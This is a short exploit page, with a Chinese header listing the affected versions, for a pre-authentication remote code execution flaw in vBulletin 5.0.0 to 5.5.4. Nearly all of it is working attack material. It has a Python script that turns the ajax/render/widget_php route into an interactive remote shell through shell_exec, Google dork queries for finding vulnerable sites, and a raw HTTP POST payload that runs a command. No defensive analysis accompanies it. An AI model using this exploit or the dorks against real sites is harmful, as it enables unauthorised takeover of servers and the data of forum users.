# vBulletin-5.x-0day-pre-auth-RCE-exploit

影响版本：vBulletin 5.0.0~5.5.4


poc如下:

#!/usr/bin/python

#

# vBulletin 5.x 0day pre-auth RCE exploit

#

# This should work on all versions from 5.0.0 till 5.5.4

#

# Google Dorks:

# - site:*.vbulletin.net

# - "Powered by vBulletin Version 5.5.4"

import requests

import sys

if len(sys.argv) != 2:

   sys.exit("Usage: %s <URL to vBulletin>" % sys.argv[0])

params = {"routestring":"ajax/render/widget_php"}

while True:

    try:

         cmd = raw_input("vBulletin$ ")

         params["widgetConfig[code]"] = "echo shell_exec('"+cmd+"'); exit;"

         r = requests.post(url = sys.argv[1], data = params)

         if r.status_code == 200:

              print r.text

         else:

              sys.exit("Exploit failed! :(")

    except KeyboardInterrupt:

         sys.exit(" Closing shell...")

    except Exception, e:

         sys.exit(str(e))






POST / HTTP/1.1

Host: *

Content-Type: application/x-www-form-urlencoded

Content-Length: 108

routestring=ajax%2Frender%2Fwidget_php&widgetConfig%5Bcode%5D=echo+shell_exec%28%27ifconfig%27%29%3B+exit%3B

